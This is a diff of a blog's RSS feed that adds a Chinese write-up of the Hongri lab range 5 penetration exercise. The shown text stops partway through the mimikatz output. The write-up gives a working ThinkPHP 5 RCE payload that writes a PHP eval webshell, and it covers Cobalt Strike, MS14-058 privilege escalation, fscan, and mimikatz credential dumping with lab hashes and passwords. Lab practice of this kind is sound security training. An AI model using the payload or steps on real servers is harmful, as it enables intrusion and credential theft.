@@ -1,4 +1,346 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Oight</title><link>https://Oight.github.io/</link><description>Recent content on Oight</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Oight</copyright><lastBuildDate>Sun, 21 Jun 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://Oight.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>红日靶场（三）渗透</title><link>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89%E6%B8%97%E9%80%8F/</link><pubDate>Sun, 21 Jun 2026 00:00:00 +0000</pubDate><guid>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89%E6%B8%97%E9%80%8F/</guid><description>&lt;h1 id="红日靶场三">红日靶场三
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Oight</title><link>https://Oight.github.io/</link><description>Recent content on Oight</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Oight</copyright><lastBuildDate>Thu, 09 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://Oight.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>红日靶场（五）渗透</title><link>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94%E6%B8%97%E9%80%8F/</link><pubDate>Thu, 09 Jul 2026 00:00:00 +0000</pubDate><guid>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94%E6%B8%97%E9%80%8F/</guid><description>&lt;h1 id="红日靶场五">红日靶场五
+&lt;/h1>&lt;p>感觉这个比前面几个简单一点（bushi）&lt;/p>
+&lt;h2 id="解法一">解法一：
+&lt;/h2>&lt;p>全程用CS做，配合一些插件比较容易可以做&lt;/p>
+&lt;p>首先扫一下开放了哪些端口&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sS 192.168.111.150 -T4 -Pn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.99 &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2026-07-09 14:00 +0800
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 192.168.111.150
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.070s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">998&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3306/tcp open mysql
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 7.49 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>开放了80和3306，开放的端口不多，先看看80上跑的是什么服务&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5n3om3j30t60dljte.jpg"
+loading="lazy"
+alt="image-20260709165944417"
+>&lt;/p>
+&lt;p>可以看到是ThinkPHP V5，知道版本后可以搜索一下有没有什么现成可以利用的CVE&lt;/p>
+&lt;p>找到了这个&lt;a class="link" href="https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/" target="_blank" rel="noopener"
+>ThinkPHP 5.x 远程代码执行漏洞&lt;/a>&lt;/p>
+&lt;p>可以验证漏洞存在&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1iexy5mxe7uj31340wbdna.jpg"
+loading="lazy"
+alt="image-20260709170309247"
+>&lt;/p>
+&lt;p>但按照上面文章中的方法写webshell写不进去，所以参考了另外一篇： &lt;a class="link" href="https://www.freebuf.com/vuls/334236.html" target="_blank" rel="noopener"
+>ThinkPHP5系列远程代码执行漏洞复现getshell&lt;/a>&lt;/p>
+&lt;p>payload：&lt;code>s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=file_put_contents&amp;amp;vars[1][]=1.php&amp;amp;vars[1][]=&amp;lt;?php @eval($_POST['1qaz']);?&amp;gt;&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1iexy5mrt6cj30o10gwdib.jpg"
+loading="lazy"
+alt="image-20260709170613137"
+>&lt;/p>
+&lt;p>连接上webshell之后就可以上线CS了&lt;/p>
+&lt;p>上线后发现这是一台windows主机，权限是Administrator&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5mnwmgj30k905xdh4.jpg"
+loading="lazy"
+alt="image-20260709170901868"
+>&lt;/p>
+&lt;p>先看看主机信息&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl"> beacon&lt;span class="p">&amp;gt;&lt;/span> shell systeminfo
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [*] Tasked beacon to run: systeminfo
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [+] host called home, sent: 41 bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [+] received output:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">主机名: WIN7
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS 名称: Microsoft Windows 7 专业版
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS 版本: 6.1.7601 Service Pack 1 Build 7601
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS 制造商: Microsoft Corporation
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS 配置: 成员工作站
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS 构件类型: Multiprocessor Free
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">注册的所有人: Windows 用户
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">注册的组织:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">产品 ID: 00371-177-0000061-85581
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">初始安装日期: 2020/3/5, 0:44:56
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">系统启动时间: 2026/7/9, 5:53:33
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">系统制造商: VMware, Inc.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">系统型号: VMware Virtual Platform
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">系统类型: x64-based PC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">处理器: 安装了 1 个处理器。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2200 Mhz
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BIOS 版本: Phoenix Technologies LTD 6.00, 2020/11/12
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Windows 目录: C:\Windows
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">系统目录: C:\Windows\system32
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">启动设备: \Device\HarddiskVolume1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">系统区域设置: zh-cn;中文(中国)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">输入法区域设置: zh-cn;中文(中国)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">时区: (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">物理内存总量: 2,047 MB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">可用的物理内存: 1,477 MB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">虚拟内存: 最大值: 4,095 MB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">虚拟内存: 可用: 3,300 MB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">虚拟内存: 使用中: 795 MB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">页面文件位置: C:\pagefile.sys
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">域&lt;span class="p">:&lt;/span> &lt;span class="nl">sun.com&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">登录服务器: 暂缺
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">修补程序: 暂缺
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">网卡: 安装了 2 个 NIC。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [01]: Intel(R) PRO/1000 MT Network Connection
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 连接名: wk1 waiwang
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 启用 DHCP: 否
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> IP 地址
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [01]: 192.168.111.150
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [02]: fe80::74ff:9ed7:53ab:d404
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [02]: Intel(R) PRO/1000 MT Network Connection
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 连接名: 本地连接
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 启用 DHCP: 否
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> IP 地址
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [01]: 192.168.138.136
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [02]: fe80::edf4:9135:b0e6:cfc4
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1iexy5midz7j30wl0x3103.jpg"
+loading="lazy"
+alt="image-20260709171150311"
+>&lt;/p>
+&lt;p>可以使用MS14-058提权&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1iexy5marcxj30pq12swkf.jpg"
+loading="lazy"
+alt="image-20260709171350956"
+>&lt;/p>
+&lt;p>shell回连&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5m52scj30kx05o75l.jpg"
+loading="lazy"
+alt="image-20260709171512757"
+>&lt;/p>
+&lt;p>现在已经提升至system权限，现在可以尝试探测内网了&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1iexy5lxu1kj30tz0djjtn.jpg"
+loading="lazy"
+alt="image-20260709171921420"
+>&lt;/p>
+&lt;p>域内只有一台主机（但我看其他WP里写是有两台，应该是我的问题）&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1iexy5m1pd1j30rv0d3q4w.jpg"
+loading="lazy"
+alt="image-20260709171712637"
+>&lt;/p>
+&lt;p>但有多个账户，我们需要横向到域控的system&lt;/p>
+&lt;p>查看一下域控IP&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1iexy5ltia9j31360ccgoo.jpg"
+loading="lazy"
+alt="image-20260709172316162"
+>&lt;/p>
+&lt;p>可以看到这是一台多网卡主机，域控IP &lt;code>192.168.138.138&lt;/code>&lt;/p>
+&lt;p>用fscan扫一下&lt;/p>
+&lt;p>先上传fscan&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5li4wyj30l70orn0o.jpg"
+loading="lazy"
+alt="image-20260709172538777"
+>&lt;/p>
+&lt;p>然后进行扫描&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1iexy5ln8d8j30ux0ncq74.jpg"
+loading="lazy"
+alt="image-20260709172443652"
+>&lt;/p>
+&lt;p>开放了445端口，似乎可以用永恒之蓝，但CS上不太好操作~~（也可能是因为我不会）~~&lt;/p>
+&lt;p>所以我们用mimikatz ： &lt;code>mimikatz sekurlsa::logonpasswords&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">[07/09 15:53:56] beacon&lt;span class="p">&amp;gt;&lt;/span> mimikatz sekurlsa::logonpasswords
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[07/09 15:53:56] [*] Tasked beacon to run mimikatz&amp;#39;s sekurlsa::logonpasswords command
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[07/09 15:53:56] [+] host called home, sent: 788090 bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[07/09 15:53:58] [+] received output:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Authentication Id : 0 ; 131439 (00000000:0002016f)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Session : Batch from 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User Name : Administrator
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Domain : SUN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Logon Server : DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Logon Time : 2026/7/9 5:54:08
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SID : S-1-5-21-3388020223-1982701712-4030140183-500
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> msv :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [00000003] Primary
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : SUN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * LM : c8c42d085b5e3da2e9260223765451f1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * NTLM : e8bea972b3549868cecd667a64a6ac46
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * SHA1 : 3688af445e35efd8a4d4e0a9eb90b754a2f3a4ee
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tspkg :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : SUN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Password : dc123.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> wdigest :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : SUN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Password : dc123.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> kerberos :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : SUN.COM
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Password : dc123.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ssp :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> credman :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [00000000]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : SUN\Administrator
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : SUN\Administrator
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Password : dc123.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Authentication Id : 0 ; 997 (00000000:000003e5)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Session : Service from 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User Name : LOCAL SERVICE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Domain : NT AUTHORITY
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Logon Server : (null)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Logon Time : 2026/7/9 5:53:50
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SID : S-1-5-19
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> msv :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tspkg :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> wdigest :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : (null)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : (null)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Password : (null)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> kerberos :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : (null)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : (null)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Password : (null)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ssp :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> credman :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Authentication Id : 0 ; 996 (00000000:000003e4)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Session : Service from 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User Name : WIN7$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Domain : SUN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Logon Server : (null)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Logon Time : 2026/7/9 5:53:50
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SID : S-1-5-20
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> msv :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [00000003] Primary
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : WIN7$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : SUN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * NTLM : 57a7c3c04367ee520cc20f7fcd52ca72
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * SHA1 : e78f8e8508562dafdb9ef67743f37cad7c7a8db1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tspkg :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> wdigest :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : WIN7$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : SUN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Password : 5a a8 6b 7a 0c 89 7d 82 02 3b aa b5 14 80 25 8e 16 21 3d a0 45 ac 96 a2 be 9b d5 6a d1 5b 12 4c 47 fb 97 b1 5b 87 c3 f1 14 87 56 90 0c 1c 80 16 ea de 26 b9 5a 64 61 d0 f1 9a a5 b9 b9 f7 17 f0 d0 98 22 e6 77 cc b2 55 b3 11 39 a2 4c 07 07 1a 38 ca 8d af f7 c8 a1 1d 18 fd 80 34 20 7c 84 3e 4d f3 46 b0 47 d3 2a 97 fd 18 0d 0c 95 d2 ec 87 ba 88 32 da 0f e0 3b c8 d5 0a d3 47 d4 2e 8f 1b 23 41 ff 20 3d 81 f4 5f bf 04 bd 4a d9 4f cd 03 53 24 68 ff 88 23 ad 33 b1 6e 1e 88 b9 1d 1f 3b 72 e3 2e 29 6c f0 ea 77 bd 14 56 5a 3d ba 59 ed 7c ba 98 6e 15 4d 1a d0 97 1d 26 04 88 d2 b5 4c ee fe 09 dc 1c df 76 0c 2e be 09 57 43 b2 c4 9d 39 a4 86 28 df 36 03 48 61 a9 e5 04 4c 41 fe 4a 09 81 33 1d da db 48 5a ed 55 20 53 95 76 9f 3d
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> kerberos :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : win7$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : SUN.COM
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Password : 5a a8 6b 7a 0c 89 7d 82 02 3b aa b5 14 80 25 8e 16 21 3d a0 45 ac 96 a2 be 9b d5 6a d1 5b 12 4c 47 fb 97 b1 5b 87 c3 f1 14 87 56 90 0c 1c 80 16 ea de 26 b9 5a 64 61 d0 f1 9a a5 b9 b9 f7 17 f0 d0 98 22 e6 77 cc b2 55 b3 11 39 a2 4c 07 07 1a 38 ca 8d af f7 c8 a1 1d 18 fd 80 34 20 7c 84 3e 4d f3 46 b0 47 d3 2a 97 fd 18 0d 0c 95 d2 ec 87 ba 88 32 da 0f e0 3b c8 d5 0a d3 47 d4 2e 8f 1b 23 41 ff 20 3d 81 f4 5f bf 04 bd 4a d9 4f cd 03 53 24 68 ff 88 23 ad 33 b1 6e 1e 88 b9 1d 1f 3b 72 e3 2e 29 6c f0 ea 77 bd 14 56 5a 3d ba 59 ed 7c ba 98 6e 15 4d 1a d0 97 1d 26 04 88 d2 b5 4c ee fe 09 dc 1c df 76 0c 2e be 09 57 43 b2 c4 9d 39 a4 86 28 df 36 03 48 61 a9 e5 04 4c 41 fe 4a 09 81 33 1d da db 48 5a ed 55 20 53 95 76 9f 3d
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ssp :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> credman :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Authentication Id : 0 ; 46412 (00000000:0000b54c)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Session : UndefinedLogonType from 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User Name : (null)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Domain : (null)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Logon Server : (null)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Logon Time : 2026/7/9 5:53:45
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SID :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> msv :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [00000003] Primary
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : WIN7$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : SUN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * NTLM : 57a7c3c04367ee520cc20f7fcd52ca72
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * SHA1 : e78f8e8508562dafdb9ef67743f37cad7c7a8db1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tspkg :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> wdigest :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> kerberos :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ssp :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> credman :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Authentication Id : 0 ; 999 (00000000:000003e7)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Session : UndefinedLogonType from 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User Name : WIN7$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Domain : SUN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Logon Server : (null)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Logon Time : 2026/7/9 5:53:45
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SID : S-1-5-18
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> msv :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tspkg :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> wdigest :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : WIN7$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : SUN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Password : 5a a8 6b 7a 0c 89 7d 82 02 3b aa b5 14 80 25 8e 16 21 3d a0 45 ac 96 a2 be 9b d5 6a d1 5b 12 4c 47 fb 97 b1 5b 87 c3 f1 14 87 56 90 0c 1c 80 16 ea de 26 b9 5a 64 61 d0 f1 9a a5 b9 b9 f7 17 f0 d0 98 22 e6 77 cc b2 55 b3 11 39 a2 4c 07 07 1a 38 ca 8d af f7 c8 a1 1d 18 fd 80 34 20 7c 84 3e 4d f3 46 b0 47 d3 2a 97 fd 18 0d 0c 95 d2 ec 87 ba 88 32 da 0f e0 3b c8 d5 0a d3 47 d4 2e 8f 1b 23 41 ff 20 3d 81 f4 5f bf 04 bd 4a d9 4f cd 03 53 24 68 ff 88 23 ad 33 b1 6e 1e 88 b9 1d 1f 3b 72 e3 2e 29 6c f0 ea 77 bd 14 56 5a 3d ba 59 ed 7c ba 98 6e 15 4d 1a d0 97 1d 26 04 88 d2 b5 4c ee fe 09 dc 1c df 76 0c 2e be 09 57 43 b2 c4 9d 39 a4 86 28 df 36 03 48 61 a9 e5 04 4c 41 fe 4a 09 81 33 1d da db 48 5a ed 55 20 53 95 76 9f 3d
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> kerberos :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Username : win7$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Domain : SUN.COM
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Password : 5a a8 6b 7a 0c 89 7d 82 02 3b aa b5 14 80 25 8e 16 21 3d a0 45 ac 96 a2 be 9b d5 6a d1 5b 12 4c 47 fb 97 b1 5b 87 c3 f1 14 87 56 90 0c 1c 80 16 ea de 26 b9 5a 64 61 d0 f1 9a a5 b9 b9 f7 17 f0 d0 98 22 e6 77 cc b2 55 b3 11 39 a2 4c 07 07 1a 38 ca 8d af f7 c8 a1 1d 18 fd 80 34 20 7c 84 3e 4d f3 46 b0 47 d3 2a 97 fd 18 0d 0c 95 d2 ec 87 ba 88 32 da 0f e0 3b c8 d5 0a d3 47 d4 2e 8f 1b 23 41 ff 20 3d 81 f4 5f bf 04 bd 4a d9 4f cd 03 53 24 68 ff 88 23 ad 33 b1 6e 1e 88 b9 1d 1f 3b 72 e3 2e 29 6c f0 ea 77 bd 14 56 5a 3d ba 59 ed 7c ba 98 6e 15 4d 1a d0 97 1d 26 04 88 d2 b5 4c ee fe 09 dc 1c df 76 0c 2e be 09 57 43 b2 c4 9d 39 a4 86 28 df 36 03 48 61 a9 e5 04 4c 41 fe 4a 09 81 33 1d da db 48 5a ed 55 20 53 95 76 9f 3d
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ssp :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> credman :
